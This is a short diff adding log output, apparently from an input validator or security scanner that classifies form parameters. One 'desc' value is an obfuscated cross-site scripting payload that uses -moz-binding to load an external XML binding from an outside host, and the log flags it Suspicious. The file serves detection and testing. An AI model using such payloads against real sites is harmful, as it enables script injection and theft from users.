@@ -1,0 +1,5 @@
+2016-07-17T18:23:21.239-06:00
+name : BF45'f1Vp5L. 8 ''73H .MD
+desc : sstyle=foobar"tstyle="foobar"ystyle="foobar"lstyle="foobar"estyle="foobar"=-moz-binding:url(http://h4k.in/mozxss.xml#xss)&gt;foobar#xss)" a="
+The parameter: name :  having value: BF45'f1Vp5L. 8 ''73H .MD is: Compliant
+The parameter: desc :  having value: sstyle=foobar"tstyle="foobar"ystyle="foobar"lstyle="foobar"estyle="foobar"=-moz-binding:url(http://h4k.in/mozxss.xml#xss)&gt;foobar#xss)" a=" is: Suspicious
